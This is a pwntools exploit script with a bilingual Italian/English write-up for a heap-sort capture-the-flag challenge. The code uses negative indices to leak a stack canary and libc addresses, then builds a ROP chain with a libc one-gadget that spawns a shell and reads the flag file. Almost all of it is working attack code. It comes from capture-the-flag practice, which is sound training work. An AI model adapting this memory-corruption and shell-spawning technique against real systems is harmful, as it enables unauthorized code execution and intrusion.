#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("obligatory_heap_pwn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.vuln+219; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)

io = start()
line = b'> '

# utility function for easy debug
def create_node(id, content):
    log.debug(f"[create_node] id={id}, content={content}")
    io.sendlineafter(line, b'1')
    io.sendlineafter(line, str(id).encode())
    io.sendafter(line, content)

def remove_order(id):
    log.debug(f"[remove_order] id={id}")
    io.sendlineafter(line, b'2')
    io.sendlineafter(line, str(id).encode())

def show_order(id):
    io.sendlineafter(line, b'3')
    io.sendlineafter(line, str(id).encode())
    io.recvuntil(b'--> ')
    order_id = int(io.recvline().strip().decode())
    io.recvuntil(b'--> ')
    order_info = int(io.recvline().strip().decode())
    log.debug(f"[show_order] id={id}, order_id={hex(order_id)}, order_info={hex(order_info)}")
    return {'id': order_id, 'info': order_info}

def sort_items():
    log.debug("[sort_items] Sorting...")
    io.sendlineafter(line, b'4')


"""
VULNERABILITÀ

La vulnerabilità risiedeva nell’algoritmo di ordinamento implementato dal programma.
Il binario permetteva di creare fino a 9 coppie chiave-valore univoche in un array.
Oltre a funzioni di cancellazione e stampa, era presente anche l’ordinamento tramite heap sort.

A causa di un bug, però, l’ordinamento poteva agire anche su valori nello stack,
al di fuori del dominio previsto (i 9 slot). Inserendo indici negativi, che una
volta castati a unsigned long diventavano enormi interi positivi, era possibile
manipolare la zona di return address.

Questo comportamento consentiva due cose:
- Far “risalire” tramite l’ordinamento dei leak sensibili (canary, indirizzi, ecc.)
- Creare una sezione manomessa e far “affondare” lo stack con ID pesanti

EXPLOIT

Data la struttura a coppie chiave-valore, la strategia più efficiente è stata usare
un one-gadget della libc, così da ridurre al minimo il numero di gadget necessari.
Impostando i valori opportuni e utilizzando un pop allineato per scartare quelli
non desiderati, è stato possibile invocare la shell.

---

ENGLISH VERSION

The vulnerability was in the program’s sorting algorithm.
The binary allowed creating up to 9 unique key-value pairs in an array.
Besides deletion and printing, it also provided sorting via heap sort.

Due to a bug, however, sorting could also affect values on the stack,
outside the intended range (the 9 slots). By inserting negative indices,
which once cast to unsigned long became very large positive integers,
it was possible to tamper with the return address area.

This behavior allowed two things:
- “Lift” sensitive leaks (canary, addresses, etc.) through sorting
- Craft a tampered section and “sink” the stack with heavy IDs

EXPLOIT

Because of the key-value structure, the most efficient approach was to use
a libc one-gadget, minimizing the number of gadgets required.
By setting the right values and using an aligned pop to discard unwanted ones,
it was possible to invoke the shell.
"""

# blocks with negative value with 10 slot of space
# from each other
max_alloc = 9
allocations = -100
log.info("Creating initial nodes to fill slots")
for i in range(1, 7):
    allocations += 10
    create_node(allocations, f"suca{allocations}".encode())
sort_items()

# now the sensible data is in the 9 upper blocks
log.info("Dumping orders to extract leaks")
dump = []
for i in range(10):
    data = show_order(i)
    dump.append(data)
    log.info(f"slot {i:02d} -> id={hex(data['id'])}, info={hex(data['info'])}")

# distances and magic numbers obtained from r2 and ghidra offsets
canary_idx, canary = dump[5]['id'], dump[5]['info']
ret_add_idx, ret_add = dump[6]['id'], dump[6]['info']
libc_idx, libc_leak = dump[8]['id'], dump[8]['info']

main_address = ret_add - 118
exe.address = main_address - exe.sym['main']
libc.address = (libc_leak + 383510) - libc.sym['puts']

log.success(f"libc base     @ {hex(libc.address)}")
log.success(f"canary value  @ {hex(canary)}")

# Cleanup of the leaked blocks (avoiding strange behaviours)
for i in dump:
    remove_order(i['id'])


'''
Now, at the time of the return, we have a setup that could work
with this one gadget:

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

'''

# pop trash, pop rbp, pop trash, ret:
pop_all = libc.address + 0x000000000011094d
null_stack = canary_idx - 168 # empty stack

log.info(f"ROP gadget pop_all @ {hex(pop_all)}")
log.success(f"nullstack index -> {null_stack}")

create_node(-59, b'AAAAAA')                     # paddding
create_node(-58, p64(canary))                   # canary
create_node(-57, p64(pop_all))                  # pop -55, pop nullstack -> rbp, pop -51 
create_node(-55, p64(null_stack + 0x78))        # -55 removed, rbp == nullstack
create_node(-51, p64(libc.address + 0xef52b))   # -51 removed, return to one gadget
sort_items()

log.info("Triggering exploit...")
io.sendline(b'5')                               # trigger exit -> return 

io.sendline(b'cat flag.txt')
flag = io.recvregex(rb'brunner\{.*\}', capture=True)
flag = flag.group(0).decode()

success(f"FLAG: {flag}")
write('flag.txt', flag)
io.close()
